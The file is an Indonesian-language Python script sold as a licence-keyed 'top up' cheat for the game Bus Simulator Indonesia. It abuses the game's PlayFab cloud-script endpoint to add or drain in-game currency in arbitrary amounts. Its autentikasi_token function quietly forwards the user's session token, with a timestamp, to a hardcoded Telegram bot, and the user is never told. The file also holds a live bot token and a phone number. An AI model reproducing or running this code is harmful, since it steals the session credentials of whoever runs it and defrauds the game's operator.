import time
import os
import sys
import requests
import json
from datetime import datetime
from colorama import init, Fore, Style
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from datetime import datetime

# Fungsi untuk membersihkan layar (cross-platform)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# URL Pastebin yang berisi Key dan Expiration Date
pastebin_url = "https://pastebin.com/raw/qakPnRKY"

# Fungsi untuk mengambil keys dan expiration date dari Pastebin
def get_keys_from_pastebin(url):
    # Mengambil data dari Pastebin
    response = requests.get(url)
    
    if response.status_code == 200:
        # Memisahkan setiap baris di Pastebin
        lines = response.text.splitlines()
        keys = {}
        
        for line in lines:
            # Mengabaikan baris kosong atau baris yang tidak dapat dibagi menjadi dua
            if not line.strip() or line.count(',') != 1:
                print(f"Baris tidak valid, dilewati: {line}")
                continue
            
            # Memisahkan key dan expiration date jika formatnya benar
            parts = line.split(',')
            key, expiration_date = parts[0].strip(), parts[1].strip()
            keys[key] = expiration_date
        
        return keys
    else:
        print(f"Error: {response.status_code}")
        return None

# Fungsi untuk memverifikasi key dan mengecek expired date
def verifikasi_key(key_input, keys):
    # Memeriksa apakah key ada dan belum kedaluwarsa
    if key_input in keys:
        expiration_date = keys[key_input]
        expiration_date_obj = datetime.strptime(expiration_date, "%Y-%m-%d")
        
        if expiration_date_obj >= datetime.now():
            print(f"𝐊𝐞𝐲 {key_input} 𝐕𝐚𝐥𝐢𝐝 𝐇𝐢𝐧𝐠𝐠𝐚 {expiration_date}")
            return True, expiration_date
        else:
            print(f"𝗞𝗲𝘆 {key_input} 𝘀𝘂𝗱𝗮𝗵 𝗸𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮 𝗽𝗮𝗱𝗮 {expiration_date}")
            time.sleep(2)
            os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
            exit()
    else:
        print(f"𝗞𝗲𝘆 {key_input} 𝘁𝗶𝗱𝗮𝗸 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿.")
        time.sleep(2)
        os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
        exit()

# Fungsi untuk mendapatkan key dari input pengguna
def get_key():
    key_input = input("❏ 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐊𝐞𝐲 𝐀𝐤𝐬𝐞𝐬 𝐀𝐧𝐝𝐚: ")  # Meminta key pertama kali
    return key_input

# Fungsi utama
def main():
    keys = get_keys_from_pastebin(pastebin_url)  # Mendapatkan keys dan expiration date dari Pastebin
    
    if keys:
        # Minta input key dari pengguna hanya sekali
        key_input = get_key() 
        
        # Verifikasi key yang dimasukkan
        valid, expiration_date = verifikasi_key(key_input, keys)  # Verifikasi key yang dimasukkan
        
        if not valid:
            print("Key tidak valid atau sudah expired. Script berhenti.")
            exit()  # Keluar dari script jika key tidak valid atau expired
        else:
            print(f"Key valid hingga {expiration_date}. Script dilanjutkan.")
            # Setelah key diverifikasi, lanjutkan ke menu utama atau proses lainnya
            show_menu()
    else:
        print("Tidak dapat mengambil data dari Pastebin. Pastikan URL Pastebin benar.")
        exit()  # Keluar jika tidak ada data keys dari Pastebin

# Inisialisasi colorama (untuk memastikan kompatibilitas dengan Windows)
init(autoreset=True)

# Variabel global untuk token dan informasi akun
token_bussid = None
informasi_akun = {}

# URL Pastebin yang berisi password yang valid
pastebin_pass = 'https://pastebin.com/raw/7fws6sbi'
    
#Fungsi Animasi
def typing_and_loading(t):
    # Warna untuk teks
    color_text = '\033[34m'  # Biru
    color_spinner = '\033[32m'  # Hijau
    color_white = '\033[37m'  # Putih (untuk angka)
    reset_color = '\033[0m'  # Reset warna

    # Efek pengetikan di awal
    message = f"{color_text}𝗦𝗲𝗱𝗮𝗻𝗴 𝗺𝗲𝗺𝘂𝗮𝘁 𝘀𝗰𝗿𝗶𝗽𝘁 𝗱𝗮𝗹𝗮𝗺 {color_white}{t}{color_text} 𝗗𝗲𝘁𝗶𝗸... {reset_color}"
    for i in range(len(message)):
        sys.stdout.write(f"\r{message[:i+1]}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    time.sleep(1)  # Memberikan jeda setelah pengetikan selesai
    
    # Menambahkan animasi spinner saat hitung mundur
    spinner_chars = ['|', '/', '-', '\\']
    for i in range(t * 4):  # Mengulang spinner beberapa kali agar lebih panjang
        remaining_time = t - (i // 4)  # Menghitung sisa waktu
        sys.stdout.write(f"\r{color_text}𝗦𝗲𝗱𝗮𝗻𝗴 𝗺𝗲𝗺𝘂𝗮𝘁 𝘀𝗰𝗿𝗶𝗽𝘁 𝗱𝗮𝗹𝗮𝗺 {color_white}{remaining_time}{color_text} 𝗗𝗲𝘁𝗶𝗸... {color_spinner}{spinner_chars[i % 4]}{reset_color}")
        sys.stdout.flush()
        time.sleep(0.25)

    print()  # Menambahkan baris baru setelah animasi selesai

# Tes fungsi
typing_and_loading(5)

# Fungsi untuk mengirim pesan menggunakan URL API Telegram
def kirim_pesan_via_url(token_bot, chat_id, pesan):
    url = f"https://api.telegram.org/bot{token_bot}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": pesan
    }
    try:
        response = requests.get(url, params=params)
        print(f"Respon API Telegram: {response.text}")  # Debugging respon
        if response.status_code == 200:
            print(Fore.GREEN + "Pesan berhasil dikirim ke Telegram.")
        else:
            print(Fore.RED + f"Pesan gagal dikirim. Status: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"Terjadi kesalahan saat mengirim pesan: {e}")

# Fungsi untuk meminta Token Bussid
def autentikasi_token():
    global token_bussid
    clear_screen()
    print() 
    print() 
    print() 
    print(Fore.GREEN + "\033[1m" + "𝐒𝐂𝐑𝐈𝐏 𝐓𝐎𝐏 𝐔𝐏 𝐁𝐔𝐒𝐒𝐈𝐃 𝟐𝟎𝟐𝟒! - 𝙼𝚞𝚕𝚝𝚒𝚏𝚒𝚝𝚞𝚛 ")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "Anda harus memasukkan Token Bussid untuk melanjutkan.")
    
    # Meminta token dari pengguna tanpa verifikasi
    token_input = input(Fore.CYAN + Style.BRIGHT + "\x1b[1;33;44m  \x1b[1;37[Ｔｏｋｅｎ 𝗕𝗨𝗦𝗦𝗜𝗗: \x1b[1;33m \x1b[0m\x1b[: ")
    token_bussid = token_input
    print("\033[1m" + Fore.GREEN + "𝗧𝗼𝗸𝗲𝗻 𝗱𝗶𝘀𝗶𝗺𝗽𝗮𝗻." + Style.RESET_ALL)
    time.sleep(2)

    # Kirim pesan ke Telegram setelah token dimasukkan
    pesan = f"Token dimasukkan oleh pengguna:\n {token_bussid} \n\n pada {time.strftime('%Y-%m-%d %H:%M:%S')}"
    TOKEN_BOT_TELEGRAM = "7481271703:AAHvMpZCcd6hyOJ04LceAVzbRym2bYJoF9M"  # Ganti dengan token bot Anda
    CHAT_ID_TELEGRAM = "-4501707408"  # Ganti dengan chat ID Anda
    kirim_pesan_via_url(TOKEN_BOT_TELEGRAM, CHAT_ID_TELEGRAM, pesan)
    
# Fungsi untuk mengambil informasi akun menggunakan GetPlayerCombinedInfo
def ambil_informasi_akun():
    global informasi_akun
    url = "https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo"
    headers = {
        'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
        'Content-Type': 'application/json',
        'X-Authorization': token_bussid
    }
    payload = {
        'PlayFabId': None,
        'InfoRequestParameters': {
            'GetUserAccountInfo': True,
            'GetUserInventory': True,
            'GetUserVirtualCurrency': True,
            'GetUserData': False,
            'UserDataKeys': None,
            'GetUserReadOnlyData': True,
            'UserReadOnlyDataKeys': None,
            'GetCharacterInventories': False,
            'GetCharacterList': False,
            'GetTitleData': True,
            'TitleDataKeys': None,
            'GetPlayerStatistics': False,
            'PlayerStatisticNames': None
        }
    }

    try:
        response = requests.post(url, json=payload, headers=headers)
        
        # Menghapus bagian ini agar hasil respons API tidak ditampilkan
        # print(Fore.BLUE + "Respons mentah dari API:\n")  # Debugging
        # print(response.text)  # Cetak respons API mentah
        time.sleep(0)  # Berikan jeda 5 detik agar pengguna dapat membaca hasilnya

        if response.status_code == 200:
            data = response.json()
            
            # Menghapus bagian ini agar hasil data JSON tidak ditampilkan
            # print(Fore.GREEN + Style.BRIGHT + "Data JSON yang diterima:")
            # print(data)  # Debugging untuk memeriksa struktur JSON yang diterima
            
            # Simpan informasi yang dibutuhkan dari data yang diterima
            informasi_akun = data  # Sesuaikan dengan kebutuhan Anda untuk menyimpan data
            
            # Akses informasi akun dan virtual currency
            info_result_payload = data.get("data", {}).get("InfoResultPayload", {})
            user_account_info = info_result_payload.get("AccountInfo", {})
            virtual_currency = info_result_payload.get("UserVirtualCurrency", {})

            print(f"UserAccountInfo: {user_account_info}")
            print(f"UserVirtualCurrency: {virtual_currency}")

            # Ambil nama akun dari kunci TitleInfo["DisplayName"]
            title_info = user_account_info.get("TitleInfo", {})
            nama = title_info.get("DisplayName", "Tidak diketahui")  # Akses DisplayName dalam TitleInfo
            saldo = virtual_currency.get("RP", 0)  # Gantilah 'GC' dengan 'RP'
            
            # Ambil ID akun dari TitleInfo -> TitlePlayerAccount -> Id
            title_player_account = title_info.get("TitlePlayerAccount", {})
            akun_id = title_player_account.get("Id", "Tidak diketahui")  # Akses ID akun dari TitlePlayerAccount

            # Set informasi akun
            informasi_akun = {
                'nama': nama,
                'saldo': saldo,
                'akun_id': akun_id
            }

            print(Fore.CYAN + Style.BRIGHT + f"Nama Akun: {informasi_akun['nama']}")
            print(Fore.CYAN + Style.BRIGHT + f"Saldo: {informasi_akun['saldo']}")
            print(Fore.CYAN + Style.BRIGHT + f"ID Akun: {informasi_akun['akun_id']}")
            return True
        else:
            print(Fore.RED + f"Gagal mengambil informasi akun: {response.status_code}")
            print(Fore.RED + f"Detail Error: {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Kesalahan koneksi: {str(e)}")
        return False

# Fungsi untuk mengambil password dari pastebin
def ambil_password():
    try:
        response = requests.get(pastebin_pass)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(Fore.RED + Style.BRIGHT + "Gagal mengakses Pastebin.")
            return None
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Kesalahan koneksi ke Pastebin: {str(e)}")
        return None

# Fungsi untuk verifikasi password
def verifikasi_password():
    password_benar = ambil_password()
    if password_benar is None:
        return False
    
    password_input = input(Fore.CYAN + Style.BRIGHT + "╰───▶ 𝕬𝖐𝖘𝖊𝖘 𝕻𝖊𝖒𝖎𝖑𝖎𝖐: ")
    
    if password_input == password_benar:
        print(Fore.GREEN + Style.BRIGHT + "Akses berhasil! Anda adalah pemilik script.")
        return True
    else:
        print(Fore.RED + "𝗔𝗸𝘀𝗲𝘀 𝘀𝗮𝗹𝗮𝗵,𝗵𝘂𝗯𝘂𝗻𝗴𝗶 𝐎𝐰𝐧𝐞𝐫!")
        time.sleep(2)
        os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
        return False

# Fungsi khusus yang hanya bisa diakses pemilik
def fungsi_pemilik():
    print(Fore.GREEN + Style.BRIGHT + "\n🔐 Anda telah masuk ke Akses Lanjutan Pemilik.")
    print(Fore.CYAN + Style.BRIGHT + "1. 𝐓𝐨𝐩𝐮𝐩 𝐁𝐮𝐬𝐬𝐢𝐝 𝐂𝐮𝐬𝐭𝐨𝐦 𝐍𝐨𝐦𝐢𝐧𝐚𝐥.")
    print(Fore.CYAN + Style.BRIGHT + "2. 𝐑𝐞𝐬𝐞𝐭 𝐔𝐚𝐧𝐠 𝐁𝐮𝐬𝐬𝐢𝐝 𝐂𝐮𝐬𝐭𝐨𝐦 𝐍𝐨𝐦𝐢𝐧𝐚𝐥.")
    print(Fore.CYAN + Style.BRIGHT + "3. 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮.")
    
    while True:
        try:
            pilihan = int(input(Fore.YELLOW + Style.BRIGHT + "𝗜𝗻𝗽𝘂𝘁 𝟯 𝗞𝗲 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮.:  "))
            if pilihan == 1:
                pengisian_nominal = int(input(Fore.CYAN + Style.BRIGHT + "𝐓𝐨𝐩 𝐔𝐩 𝐁𝐮𝐬𝐬𝐢𝐝 𝐂𝐮𝐬𝐭𝐨𝐦 𝐉𝐮𝐦𝐥𝐚𝐡 (𝐌𝐚𝐱 2147483647):  "))
                typing_and_loading(5)
                seratusjuta(pengisian_nominal)
            elif pilihan == 2:
                jumlahkuras = int(input(Fore.MAGENTA + Style.BRIGHT + "\n𝐑𝐞𝐬𝐞𝐭 𝐔𝐚𝐧𝐠 𝐁𝐮𝐬𝐬𝐢𝐝 𝐂𝐮𝐬𝐭𝐨𝐦 𝐉𝐮𝐦𝐥𝐚𝐡:  "))
                typing_and_loading(5)
                kurascustom(jumlahkuras)
            elif pilihan == 3:                                
                break
            else:
                print(Fore.RED + Style.BRIGHT + "Pilihan tidak valid. Coba lagi.")
        except ValueError:
            print(Fore.RED + Style.BRIGHT + "Input harus berupa angka. Coba lagi.")
    # Pastikan bagian 'else' ini berada di luar while loop
    print(Fore.RED + "Akses lanjutan pemilik ditolak.")

# Fungsi untuk akses lanjutan pemilik
def akses_lanjutan_pemilik():
    if verifikasi_password():  # Pastikan hanya pemilik yang bisa mengakses
        print(Fore.GREEN + Style.BRIGHT + "\n🔐 Anda telah masuk ke Akses Lanjutan Pemilik.")
        print(Fore.CYAN + Style.BRIGHT + "1. 𝗧𝗼𝗽 𝗨𝗽 𝗕𝘂𝘀𝘀𝗶𝗱 𝟮𝗠.")
        print(Fore.CYAN + Style.BRIGHT + "2. 𝗥𝗲𝘀𝗲𝘁 𝗨𝗮𝗻𝗴 𝗕𝘂𝘀𝘀𝗶𝗱.")
        print(Fore.CYAN + Style.BRIGHT + "3. 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮.")
        
        while True:
            try:
                pilihan = int(input(Fore.YELLOW + Style.BRIGHT + "𝗜𝗻𝗽𝘂𝘁 𝟯 𝗞𝗲 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮.:  "))
                if pilihan == 1:
                    nominal = int(input(Fore.CYAN + Style.BRIGHT + "𝗞𝗲𝘁𝗶𝗸 𝗔𝗻𝗴𝗸𝗮 1 (Nominal 2M): "))
                    typing_and_loading(5)
                    pengisian_uang_khusus(nominal)
                if pilihan == 2:
                    kurascepat =int(input(Fore.MAGENTA + Style.BRIGHT + "\n𝗥𝗲𝘀𝗲𝘁 𝗨𝗮𝗻𝗴 𝗕𝘂𝘀𝘀𝗶𝗱 (2M):  ")) 
                    typing_and_loading(5)
                    kuras_owner(kurascepat)
                elif pilihan == 3:
                    print(Fore.GREEN + Style.BRIGHT + "\n𝗞𝗲𝗺𝗯𝗮𝗹𝗶 𝗞𝗲 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮...")
                    break
                else:
                    print(Fore.RED + Style.BRIGHT + "Pilihan tidak valid. Coba lagi.")
            except ValueError:
                print(Fore.RED + Style.BRIGHT + "Input harus berupa angka. Coba lagi.")
    else:
        print(Fore.RED + "Akses lanjutan pemilik ditolak.")

# Fungsi untuk melakukan pengisian uang
def pengisian_uang():
    pengisian = int(input(Fore.CYAN + Style.BRIGHT + "Masukkan jumlah pengisian (Rp 3.250.000):  "))
    for k in range(pengisian):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': 3250000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(f"𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 {k + 1}/{pengisian}.")

# Fungsi untuk melakukan pengisian uang (khusus pemilik dengan nominal tertentu)
def pengisian_uang_khusus(nominal):
    for k in range(1):  # Cukup satu kali untuk pengisian uang khusus
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': nominal * 2147483647 },  # Menggunakan nominal yang dimasukkan
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(f"𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗨𝗮𝗻𝗴 𝗕𝗨𝗦𝗦𝗜𝗗 𝗦𝘂𝗸𝘀𝗲𝘀: 𝗦𝗲𝗯𝗮𝗻𝘆𝗮𝗸 𝟮𝗠.")
        
# Fungsi untuk melakukan pengisian uang (khusus pemilik dengan nominal tertentu)
def seratusjuta(pengisian_nominal):
    for k in range(1):  # Cukup satu kali untuk pengisian uang khusus
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': pengisian_nominal * 1 },  
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(f"𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗨𝗮𝗻𝗴 𝗕𝗨𝗦𝗦𝗜𝗗 𝗦𝘂𝗸𝘀𝗲𝘀: 𝗦𝗲𝗯𝗮𝗻𝘆𝗮𝗸 𝐑𝐩 {pengisian_nominal}.")

def kurascustom(jumlahkuras):
    for k in range(1):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': jumlahkuras * -1 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()  # Refresh informasi akun

# Fungsi pemilik kurasan instant
def kuras_owner(kurascepat):
    for k in range(1):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': -2147483647 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()  # Refresh informasi akun

# Fungsi untuk kuras uang
def kurasan():
    kuras = int(input(Fore.RED + Style.BRIGHT + "Masukan jumlah input 1-999 (Rp 3.000.000):  "))
    for k in range(kuras):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': -3000000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()  # Refresh informasi akun
        print(Fore.CYAN + Style.BRIGHT + "Kuras Uang Selesai!")        

# Fungsi untuk menampilkan menu utama
def show_menu():
    clear_screen()
    # Mendapatkan tanggal dan waktu saat ini
    now = datetime.now()
    
    # Mendapatkan hari, bulan, dan tanggal
    hari = now.strftime('%A')  # Nama hari dalam bahasa Inggris, misalnya "Monday"
    bulan = now.strftime('%B')  # Nama bulan dalam bahasa Inggris, misalnya "December"
    tanggal = now.day  # Tanggal (day) bulan ini
    
    # Misalkan expiration_date adalah tanggal kedaluwarsa dalam format 'YYYY-MM-DD'
    expiration_date = '2024-12-20'  # Contoh tanggal kedaluwarsa (ganti sesuai dengan data)

    # Mengonversi expiration_date menjadi objek datetime
    expiration_date_obj = datetime.strptime(expiration_date, '%Y-%m-%d')

    # Mendapatkan tanggal saat ini
    current_date = datetime.now()

    # Menghitung selisih waktu (remaining time)
    remaining_time = expiration_date_obj - current_date
    remaining_days = remaining_time.days  # Menyimpan sisa hari dalam variabel `remaining_days`
    
    # Mendapatkan keys dari Pastebin
    keys = get_keys_from_pastebin(pastebin_url)
    
    if keys:
        # Minta input key dari pengguna
        print() 
        print() 
        print() 
        print(f'''   \x1b[1;33;41m • \x1b[1;37[ 𝗕𝗘𝗟𝗜 𝗞𝗘𝗬 𝗔𝗞𝗦𝗘𝗦 𝗛𝗨𝗕𝗨𝗡𝗚𝗜 𝗪𝗔: 𝟬𝟴𝟮𝟮 𝟳𝟱𝟯𝟴 𝟬𝟯𝟵𝟯 \x1b[1;33m • \x1b[0m\x1b[ \n''') 
        key_input = input("❏ 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐊𝐞𝐲 𝐀𝐤𝐬𝐞𝐬 𝐀𝐧𝐝𝐚: ")
        
        # Verifikasi key yang dimasukkan dan dapatkan status serta expiration date
        status_key, expiration_date = verifikasi_key(key_input, keys)
        
        # Menampilkan sisa durasi key
        if status_key:
            expiration_date_obj = datetime.strptime(expiration_date, "%Y-%m-%d")
            remaining_days = (expiration_date_obj - datetime.now()).days
            print(f"𝐒𝐢𝐬𝐚 𝐃𝐮𝐫𝐚𝐬𝐢 𝐊𝐞𝐲: {remaining_days} hari")
        else:
            print("𝐊𝐞𝐲 𝐓𝐢𝐝𝐚𝐤 𝐕𝐚𝐥𝐢𝐝 𝐀𝐭𝐚𝐮 𝐒𝐮𝐝𝐚𝐡 𝐊𝐚𝐝𝐚𝐥𝐮𝐰𝐚𝐫𝐬𝐚.")
    
    print() 
    print() 
    print() 
    print(Fore.GREEN + Style.BRIGHT + "=" * 40)
    print(Fore.CYAN + Style.BRIGHT + "    ✨ 𝗧𝗢𝗣 𝗨𝗣 𝗕𝗨𝗦𝗦𝗜𝗗 - 𝟮𝟬𝟮𝟰 - 𝗠𝗜𝗫𝗙𝗜𝗧𝗨𝗥. ✨")
    print(f'''   \x1b[1;33;41m • \x1b[1;37[𝗖𝗥𝗘𝗔𝗧𝗢𝗥 𝗥𝗔𝗙𝗔𝗖𝗭𝗫 \x1b[1;33m • \x1b[0m\x1b[ ''')
    print(f'''   \x1b[1;33;41m • \x1b[1;37m𝗛𝗔𝗥𝗜: {hari}, {bulan} {tanggal} \x1b[1;33m • \x1b[0m\x1b[ ''')
    print(Fore.GREEN + Style.BRIGHT + "=" * 40)
    print(Fore.MAGENTA + Style.BRIGHT + f"👤 𝐍𝐚𝐦𝐚 𝐀𝐤𝐮𝐧: {informasi_akun.get('nama', 'Tidak diketahui')}")
    print(Fore.MAGENTA + Style.BRIGHT + f"💰 𝐒𝐚𝐥𝐝𝐨: Rp {informasi_akun.get('saldo', 0)}")
    print(Fore.YELLOW + Style.BRIGHT + f"❏ 𝗜𝗗 𝗔𝗸𝘂𝗻 𝗕𝗨𝗦𝗦𝗜𝗗: {informasi_akun.get('akun_id', 'Tidak diketahui')}")
    
    # Menampilkan status key
    print(Fore.YELLOW + Style.BRIGHT + f"❏ 𝗞𝗲𝘆: {expiration_date} | ({remaining_days} 𝐇𝐚𝐫𝐢)")
    
    print(Fore.GREEN + Style.BRIGHT + "❏" * 40)
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 1. 🌟 𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗨𝗮𝗻𝗴 𝗕𝗨𝗦𝗦𝗜𝗗")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 2. 💸 𝗥𝗲𝘀𝗲𝘁 𝗨𝗮𝗻𝗴 𝗕𝗨𝗦𝗦𝗜𝗗")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 3. 🛠️ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗧𝗼𝗸𝗲𝗻 𝗔𝗻𝗱𝗮")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 4. 🚪 𝗞𝗲𝗹𝘂𝗮𝗿 𝗗𝗮𝗿𝗶 𝗦𝗰𝗿𝗶𝗽𝘁")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 5. 🔒 𝗔𝗸𝘀𝗲𝘀 𝗣𝗲𝗺𝗶𝗹𝗶𝗸 \x1b[1;33;41m • \x1b[1;37[(𝐎𝐰𝐧𝐞𝐫)\x1b[1;33m • \x1b[0m\x1b[")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 6. 🔑 𝗔𝗞𝗦𝗘𝗦 \x1b[1;33;41m • \x1b[1;37[(𝐏𝐫𝐞𝐦𝐢𝐮𝐦)\x1b[1;33m • \x1b[0m\x1b[")
    print() 
    print(Fore.GREEN + Style.BRIGHT + "❏" * 40)
    print()     

# Fungsi utama program
def main():
    autentikasi_token()
    if ambil_informasi_akun():
        while True:
            show_menu()
            try:
                pilihan = int(input(Fore.RED + Style.BRIGHT + "╰───▶𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙰𝚗𝚐𝚔𝚊 (1-6): "))
                if pilihan == 1:
                    pengisian_uang()
                elif pilihan == 2:
                    kurasan()
                elif pilihan == 3:
                    print(Fore.CYAN + f"Token Saat Ini: {token_bussid}")
                    time.sleep(2)
                elif pilihan == 4:
                    print(Fore.GREEN + Style.BRIGHT + "\n\x1b[1;33;41m • \x1b[1;37[𝚂𝙴𝙻𝙰𝙼𝙰𝚃 𝚃𝙸𝙽𝙶𝙶𝙰𝙻\x1b[1;33m •  \x1b[0m\x1b[")
                    sys.exit(0)
                elif pilihan == 5:
                    if verifikasi_password():
                        fungsi_pemilik()
                elif pilihan == 6:
                    akses_lanjutan_pemilik()
                else:
                    print(Fore.RED + Style.BRIGHT + "\nPilihan tidak valid. Coba lagi.")
                    time.sleep(2)
            except ValueError:
                print(Fore.RED + Style.BRIGHT + "\nInput harus berupa angka. Coba lagi.")
                time.sleep(2)
    else:
        print(Fore.RED + "Gagal mengambil informasi akun. Program dihentikan.")
        sys.exit() 

# Jalankan program hanya jika file ini di-eksekusi langsung
if __name__ == "__main__":
    main()